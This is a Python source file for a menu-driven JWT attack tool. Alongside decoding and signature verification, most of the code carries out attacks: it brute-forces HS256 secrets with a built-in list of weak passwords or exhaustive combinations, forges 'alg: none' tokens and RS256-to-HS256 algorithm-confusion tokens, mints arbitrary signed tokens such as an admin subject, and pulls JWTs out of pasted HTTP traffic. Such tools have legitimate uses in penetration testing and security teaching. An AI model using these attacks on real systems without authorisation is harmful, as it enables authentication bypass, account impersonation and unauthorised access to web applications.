#!/usr/bin/env python3
"""
JWT Token Analyzer
Decode, verify, and crack JSON Web Tokens
"""

import re
import base64
import json
import hashlib
import hmac
import time
from itertools import product

def run():
    print("\033[92m" + "="*70)
    print("           JWT TOKEN ANALYZER")
    print("="*70 + "\033[0m\n")
    
    print("\033[97mChoose Operation:\033[0m")
    print("  [1] Decode JWT Token")
    print("  [2] Verify JWT Signature")
    print("  [3] Crack JWT Secret (HS256)")
    print("  [4] Test None Algorithm Attack")
    print("  [5] Test Algorithm Confusion (RS256 to HS256)")
    print("  [6] Generate Forged JWT")
    print("  [7] Extract JWT from Request")
    
    choice = input("\n\033[95m[?] Select option: \033[0m").strip()
    
    if choice == '1':
        decode_jwt()
    elif choice == '2':
        verify_jwt()
    elif choice == '3':
        crack_jwt_secret()
    elif choice == '4':
        test_none_algorithm()
    elif choice == '5':
        test_algorithm_confusion()
    elif choice == '6':
        generate_forged_jwt()
    elif choice == '7':
        extract_jwt()
    else:
        print("\033[91m[!] Invalid choice.\033[0m")

def decode_jwt():
    """Decode and display JWT token"""
    print("\n\033[92m[*] JWT Token Decoder\033[0m\n")
    
    token = input("\033[97m[?] Enter JWT token: \033[0m").strip()
    if not token:
        print("\033[91m[!] No token provided.\033[0m")
        return
    
    try:
        parts = token.split('.')
        
        if len(parts) != 3:
            print("\033[91m[!] Invalid JWT format. Expected 3 parts separated by dots.\033[0m")
            return
        
        # Decode header
        header = decode_base64url(parts[0])
        header_json = json.loads(header)
        
        # Decode payload
        payload = decode_base64url(parts[1])
        payload_json = json.loads(payload)
        
        # Signature (keep encoded)
        signature = parts[2]
        
        # Display results
        print("\033[92m" + "="*70)
        print("HEADER")
        print("="*70 + "\033[0m")
        print(json.dumps(header_json, indent=2))
        
        print("\n\033[92m" + "="*70)
        print("PAYLOAD")
        print("="*70 + "\033[0m")
        print(json.dumps(payload_json, indent=2))
        
        # Check expiration
        if 'exp' in payload_json:
            exp_time = payload_json['exp']
            current_time = int(time.time())
            
            if exp_time < current_time:
                print(f"\n\033[91m[!] Token EXPIRED ({time.ctime(exp_time)})\033[0m")
            else:
                remaining = exp_time - current_time
                print(f"\n\033[92m[+] Token valid for {remaining} seconds ({time.ctime(exp_time)})\033[0m")
        
        # Check issued at
        if 'iat' in payload_json:
            print(f"\033[97m[*] Issued at: {time.ctime(payload_json['iat'])}\033[0m")
        
        print(f"\n\033[93m[*] Signature (base64url): {signature}\033[0m")
        print(f"\033[93m[*] Algorithm: {header_json.get('alg', 'unknown')}\033[0m")
        
        # Security warnings
        print("\n\033[92m" + "="*70)
        print("SECURITY ANALYSIS")
        print("="*70 + "\033[0m")
        
        warnings = []
        
        if header_json.get('alg', '').lower() == 'none':
            warnings.append("⚠️  Algorithm is 'none' - signature not verified!")
        
        if header_json.get('alg', '') == 'HS256':
            warnings.append("ℹ️  HS256 algorithm - secret may be brute-forceable")
        
        if 'kid' in header_json:
            warnings.append(f"ℹ️  Key ID present: {header_json['kid']} - possible injection point")
        
        if not payload_json.get('exp'):
            warnings.append("⚠️  No expiration time set - token never expires!")
        
        if payload_json.get('iss'):
            print(f"[*] Issuer: {payload_json['iss']}")
        
        if payload_json.get('sub'):
            print(f"[*] Subject: {payload_json['sub']}")
        
        if payload_json.get('aud'):
            print(f"[*] Audience: {payload_json['aud']}")
        
        if warnings:
            print("\n\033[93mSecurity Warnings:\033[0m")
            for warning in warnings:
                print(f"  {warning}")
        
        # Save option
        save = input("\n\033[95m[?] Save decoded token? (y/n): \033[0m").strip().lower()
        if save == 'y':
            filename = "jwt_decoded.json"
            with open(filename, 'w') as f:
                json.dump({
                    'header': header_json,
                    'payload': payload_json,
                    'signature': signature
                }, f, indent=2)
            print(f"\033[92m[*] Saved to {filename}\033[0m")
        
    except Exception as e:
        print(f"\033[91m[!] Error decoding JWT: {str(e)}\033[0m")

def verify_jwt():
    """Verify JWT signature"""
    print("\n\033[92m[*] JWT Signature Verifier\033[0m\n")
    
    token = input("\033[97m[?] Enter JWT token: \033[0m").strip()
    secret = input("\033[97m[?] Enter secret key: \033[0m").strip()
    
    if not token or not secret:
        print("\033[91m[!] Token and secret required.\033[0m")
        return
    
    try:
        parts = token.split('.')
        header = decode_base64url(parts[0])
        header_json = json.loads(header)
        
        algorithm = header_json.get('alg', '')
        
        # Calculate signature
        message = f"{parts[0]}.{parts[1]}"
        
        if algorithm == 'HS256':
            calculated_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            ).decode().rstrip('=')
        elif algorithm == 'HS384':
            calculated_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
            ).decode().rstrip('=')
        elif algorithm == 'HS512':
            calculated_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
            ).decode().rstrip('=')
        else:
            print(f"\033[93m[!] Algorithm {algorithm} not supported for verification.\033[0m")
            return
        
        provided_sig = parts[2]
        
        if calculated_sig == provided_sig:
            print(f"\n\033[92m[+] SIGNATURE VALID! ✓\033[0m")
            print(f"\033[97m[*] The secret '{secret}' is correct.\033[0m")
        else:
            print(f"\n\033[91m[!] SIGNATURE INVALID! ✗\033[0m")
            print(f"\033[97m[*] Expected: {calculated_sig}\033[0m")
            print(f"\033[97m[*] Got:      {provided_sig}\033[0m")
        
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")

def crack_jwt_secret():
    """Brute-force JWT secret"""
    print("\n\033[92m[*] JWT Secret Cracker (HS256)\033[0m\n")
    
    token = input("\033[97m[?] Enter JWT token: \033[0m").strip()
    if not token:
        print("\033[91m[!] No token provided.\033[0m")
        return
    
    print("\n\033[97mChoose wordlist:\033[0m")
    print("  [1] Common secrets (built-in)")
    print("  [2] Custom wordlist file")
    print("  [3] Brute-force (length-based)")
    
    choice = input("\033[95m[?] Select: \033[0m").strip()
    
    if choice == '1':
        # Common weak secrets
        wordlist = [
            'secret', 'password', '123456', 'admin', 'qwerty',
            'letmein', 'welcome', 'monkey', '1234567890', 'password123',
            'admin123', 'root', 'toor', 'test', 'secret123',
            'supersecret', 'mysecret', 'jwt_secret', 'jwtsecret',
            'key', 'secretkey', 'mykey', 'privatekey', 'changeme',
            '', 'null', 'undefined', 'default', 'token',
            'your-256-bit-secret', 'your-secret-key', 'shhhh',
            'P@ssw0rd', 'P@ssword', 'Password1', 'Admin123'
        ]
    elif choice == '2':
        filepath = input("\033[97m[?] Wordlist file path: \033[0m").strip()
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                wordlist = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"\033[91m[!] Error reading file: {str(e)}\033[0m")
            return
    elif choice == '3':
        length = int(input("\033[97m[?] Maximum length (warning: slow for >4): \033[0m").strip() or "4")
        chars = input("\033[97m[?] Character set (default: lowercase): \033[0m").strip() or "abcdefghijklmnopqrstuvwxyz"
        
        print(f"\033[93m[!] Generating all combinations up to length {length}...\033[0m")
        wordlist = []
        for l in range(1, length + 1):
            for combo in product(chars, repeat=l):
                wordlist.append(''.join(combo))
        
        print(f"\033[97m[*] Generated {len(wordlist)} combinations\033[0m")
    else:
        print("\033[91m[!] Invalid choice.\033[0m")
        return
    
    print(f"\n\033[97m[*] Attempting to crack JWT secret...\033[0m")
    print(f"\033[97m[*] Wordlist size: {len(wordlist)}\033[0m\n")
    
    try:
        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        provided_sig = parts[2]
        
        start_time = time.time()
        
        for i, secret in enumerate(wordlist):
            # Show progress
            if i % 100 == 0:
                print(f"\r\033[97m[*] Tested: {i}/{len(wordlist)}\033[0m", end='', flush=True)
            
            # Calculate signature
            calculated_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            ).decode().rstrip('=')
            
            if calculated_sig == provided_sig:
                elapsed = time.time() - start_time
                print(f"\n\n\033[92m[+] SECRET FOUND! ✓\033[0m")
                print(f"\033[92m[+] Secret: '{secret}'\033[0m")
                print(f"\033[97m[*] Time: {elapsed:.2f}s\033[0m")
                print(f"\033[97m[*] Attempts: {i+1}/{len(wordlist)}\033[0m")
                return
        
        elapsed = time.time() - start_time
        print(f"\n\n\033[91m[!] Secret not found.\033[0m")
        print(f"\033[97m[*] Tested {len(wordlist)} secrets in {elapsed:.2f}s\033[0m")
        
    except Exception as e:
        print(f"\n\033[91m[!] Error: {str(e)}\033[0m")

def test_none_algorithm():
    """Test 'none' algorithm vulnerability"""
    print("\n\033[92m[*] None Algorithm Attack\033[0m\n")
    print("\033[97m[*] This tests if server accepts JWTs with 'alg: none'\033[0m\n")
    
    token = input("\033[97m[?] Enter original JWT token: \033[0m").strip()
    if not token:
        print("\033[91m[!] No token provided.\033[0m")
        return
    
    try:
        parts = token.split('.')
        
        # Decode and modify header
        header_json = json.loads(decode_base64url(parts[0]))
        header_json['alg'] = 'none'
        
        # Re-encode header
        new_header = encode_base64url(json.dumps(header_json, separators=(',', ':')))
        
        # Keep payload the same
        payload = parts[1]
        
        # Create token with no signature
        forged_token = f"{new_header}.{payload}."
        
        print(f"\n\033[92m[+] Forged Token (no signature):\033[0m")
        print(f"\033[93m{forged_token}\033[0m\n")
        
        print("\033[97m[*] Test this token with the application.\033[0m")
        print("\033[97m[*] If accepted, the server is vulnerable to none algorithm attack!\033[0m\n")
        
        # Also try without trailing dot
        forged_token_no_dot = f"{new_header}.{payload}"
        print(f"\033[92m[+] Alternative (no trailing dot):\033[0m")
        print(f"\033[93m{forged_token_no_dot}\033[0m\n")
        
        # Save
        save = input("\033[95m[?] Save forged tokens? (y/n): \033[0m").strip().lower()
        if save == 'y':
            with open("jwt_none_attack.txt", 'w') as f:
                f.write(f"Original Token:\n{token}\n\n")
                f.write(f"Forged Token (with dot):\n{forged_token}\n\n")
                f.write(f"Forged Token (no dot):\n{forged_token_no_dot}\n")
            print("\033[92m[*] Saved to jwt_none_attack.txt\033[0m")
        
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")

def test_algorithm_confusion():
    """Test RS256 to HS256 algorithm confusion"""
    print("\n\033[92m[*] Algorithm Confusion Attack (RS256 → HS256)\033[0m\n")
    print("\033[97m[*] This attack exploits servers that use RSA public key as HMAC secret\033[0m\n")
    
    token = input("\033[97m[?] Enter original JWT token: \033[0m").strip()
    public_key_path = input("\033[97m[?] Path to RSA public key file: \033[0m").strip()
    
    if not token or not public_key_path:
        print("\033[91m[!] Token and public key required.\033[0m")
        return
    
    try:
        # Read public key
        with open(public_key_path, 'r') as f:
            public_key = f.read()
        
        parts = token.split('.')
        
        # Modify header algorithm
        header_json = json.loads(decode_base64url(parts[0]))
        header_json['alg'] = 'HS256'
        
        new_header = encode_base64url(json.dumps(header_json, separators=(',', ':')))
        payload = parts[1]
        
        # Sign with public key as HMAC secret
        message = f"{new_header}.{payload}"
        signature = base64.urlsafe_b64encode(
            hmac.new(public_key.encode(), message.encode(), hashlib.sha256).digest()
        ).decode().rstrip('=')
        
        forged_token = f"{new_header}.{payload}.{signature}"
        
        print(f"\n\033[92m[+] Forged Token (RS256→HS256):\033[0m")
        print(f"\033[93m{forged_token}\033[0m\n")
        
        print("\033[97m[*] If the server accepts this token, it's vulnerable!\033[0m\n")
        
        save = input("\033[95m[?] Save forged token? (y/n): \033[0m").strip().lower()
        if save == 'y':
            with open("jwt_confusion_attack.txt", 'w') as f:
                f.write(f"Original Token:\n{token}\n\n")
                f.write(f"Forged Token (RS256→HS256):\n{forged_token}\n")
            print("\033[92m[*] Saved to jwt_confusion_attack.txt\033[0m")
        
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")

def generate_forged_jwt():
    """Generate completely forged JWT"""
    print("\n\033[92m[*] JWT Forger\033[0m\n")
    
    print("\033[97m[*] Enter JWT header (JSON format):\033[0m")
    print("  Example: {\"alg\": \"HS256\", \"typ\": \"JWT\"}")
    header_input = input("  Header: ").strip()
    
    print("\n\033[97m[*] Enter JWT payload (JSON format):\033[0m")
    print("  Example: {\"sub\": \"admin\", \"name\": \"Admin User\", \"iat\": 1516239022}")
    payload_input = input("  Payload: ").strip()
    
    secret = input("\n\033[97m[?] Enter secret key (leave empty for 'none' algorithm): \033[0m").strip()
    
    try:
        header_json = json.loads(header_input)
        payload_json = json.loads(payload_input)
        
        # Encode header and payload
        header_b64 = encode_base64url(json.dumps(header_json, separators=(',', ':')))
        payload_b64 = encode_base64url(json.dumps(payload_json, separators=(',', ':')))
        
        message = f"{header_b64}.{payload_b64}"
        
        # Generate signature
        if secret:
            algorithm = header_json.get('alg', 'HS256')
            
            if algorithm == 'HS256':
                sig_hash = hashlib.sha256
            elif algorithm == 'HS384':
                sig_hash = hashlib.sha384
            elif algorithm == 'HS512':
                sig_hash = hashlib.sha512
            else:
                print(f"\033[93m[!] Unsupported algorithm: {algorithm}, using HS256\033[0m")
                sig_hash = hashlib.sha256
            
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), sig_hash).digest()
            ).decode().rstrip('=')
            
            token = f"{message}.{signature}"
        else:
            token = f"{message}."
        
        print(f"\n\033[92m[+] Forged JWT Token:\033[0m")
        print(f"\033[93m{token}\033[0m\n")
        
        save = input("\033[95m[?] Save token? (y/n): \033[0m").strip().lower()
        if save == 'y':
            with open("jwt_forged.txt", 'w') as f:
                f.write(f"Forged JWT Token:\n{token}\n\n")
                f.write(f"Header:\n{json.dumps(header_json, indent=2)}\n\n")
                f.write(f"Payload:\n{json.dumps(payload_json, indent=2)}\n\n")
                f.write(f"Secret: {secret}\n")
            print("\033[92m[*] Saved to jwt_forged.txt\033[0m")
        
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")

def extract_jwt():
    """Extract JWT from HTTP request"""
    print("\n\033[92m[*] JWT Extractor\033[0m\n")
    print("\033[97m[*] Paste HTTP request or response (press Ctrl+D when done):\033[0m\n")
    
    lines = []
    try:
        while True:
            line = input()
            lines.append(line)
    except EOFError:
        pass
    
    text = '\n'.join(lines)
    
    # JWT pattern (basic)
    jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
    
    tokens = re.findall(jwt_pattern, text)
    
    if tokens:
        print(f"\n\033[92m[+] Found {len(tokens)} JWT token(s)!\033[0m\n")
        
        for i, token in enumerate(tokens, 1):
            print(f"\033[93m[{i}] {token}\033[0m\n")
        
        if len(tokens) == 1:
            decode_this = input("\033[95m[?] Decode this token? (y/n): \033[0m").strip().lower()
            if decode_this == 'y':
                # Redirect to decoder
                print()
                try:
                    parts = tokens[0].split('.')
                    header = json.loads(decode_base64url(parts[0]))
                    payload = json.loads(decode_base64url(parts[1]))
                    
                    print("\033[92mHEADER:\033[0m")
                    print(json.dumps(header, indent=2))
                    print("\n\033[92mPAYLOAD:\033[0m")
                    print(json.dumps(payload, indent=2))
                except:
                    pass
    else:
        print("\033[91m[!] No JWT tokens found.\033[0m")

def decode_base64url(data):
    """Decode base64url encoded data"""
    # Add padding if needed
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    
    return base64.urlsafe_b64decode(data).decode('utf-8')

def encode_base64url(data):
    """Encode data in base64url format"""
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

if __name__ == "__main__":
    run()
